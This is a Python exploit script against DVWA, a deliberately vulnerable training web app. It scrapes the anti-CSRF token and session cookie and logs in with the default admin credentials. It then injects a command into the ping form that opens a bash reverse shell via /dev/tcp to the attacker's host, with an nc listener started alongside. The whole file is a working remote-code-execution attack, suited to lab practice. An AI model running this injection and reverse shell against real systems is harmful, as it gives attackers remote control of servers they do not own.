#!/usr/bin/python3

import requests
import re
import sys
import subprocess
import shlex
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}

class Interface ():
	def __init__ (self):
		self.red = '\033[91m'
		self.green = '\033[92m'
		self.white = '\033[37m'
		self.yellow = '\033[93m'
		self.bold = '\033[1m'
		self.end = '\033[0m'

	def header(self):
		print('\n    >> DVWA - Remote Code Execution')
		print('    >> by twseptian\n')

	def info (self, message):
		print(f"[{self.white}*{self.end}] {message}")

	def warning (self, message):
		print(f"[{self.yellow}!{self.end}] {message}")

	def error (self, message):
		print(f"[{self.red}x{self.end}] {message}")

	def success (self, message):
		print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

security_level = "low"
target_ip = '172.17.0.2' #change target ip
target_port = '80' #change target port
localhost = '172.17.0.1' #change localhost ip
localport = '4444' #change localport

url = 'http://'+target_ip+':'+target_port+'/login.php'

def csrf_token():
    try:
        # check request into url target
        output.info("URL: %s/login.php" %target_ip)
        r = requests.get(url, allow_redirects= False)
    except:
        output.error("\n[!] csrf_token: Failed to connect URL. \n[i] Quitting")
        sys.exit(-1)

    #Extract anti-csrf token
    source = BeautifulSoup(r.text, "html.parser")
    user_token = source("input", {"name": "user_token"})[0]["value"]
    output.info("Grabing user_token: %s"% user_token)

    #Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    output.info("Grabing session_id: %s"%session_id)

    return session_id, user_token

def login_to_dvwa(session_id, user_token):
    #POST Data
    global cookies
    data = {"username": "admin", "password": "password", "Login":"Login","user_token": user_token}
    cookies = {"PHPSESSID": session_id, "security": security_level}
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0","Content-Type": "application/x-www-form-urlencoded", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded","Content-Length": "88"
    }
    try:
        print("\n")
        output.info("URL: %s/login.php" %target_ip)
        output.info("Data: %s" %data)
        output.info("Cookie: %s" %cookies)
        r = requests.post(url, data=data, cookies=cookies, headers=headers, verify=False, proxies=proxies, allow_redirects=False)
    except:
        output.error("Login failed, quiting")
        sys.exit(-1)
    
    if r.headers["Location"] != 'index.php':
        output.error("Login failed")
        exit()
    output.success("Logged in Successfully")
    return True

def command_injection():
    output.warning("Command Injection to remote code execution")
    payload = "127.0.0.1 | /bin/bash -c 'bash -i >& /dev/tcp/"+localhost+"/"+localport+" 0>&1'"
    data_input = {"ip": payload,"Submit": "Submit"}
    listener = "nc -nvlp {}".format(localport)
    args = shlex.split(listener)
    subprocess.Popen(args)
    output.warning("Take RCE\n")
    input_ci = requests.post('http://'+target_ip+':'+target_port+'/vulnerabilities/exec/', cookies=cookies, data=data_input, proxies=proxies)

def main():
    # Get initial CSRF token
    session_id, user_token = csrf_token()
    # Login to DVWA
    login_to_dvwa(session_id, user_token)
    # Trigger Command Injection,RCE
    command_injection()

if __name__ == "__main__":
   try:
      main()
   except KeyboardInterrupt:
      pass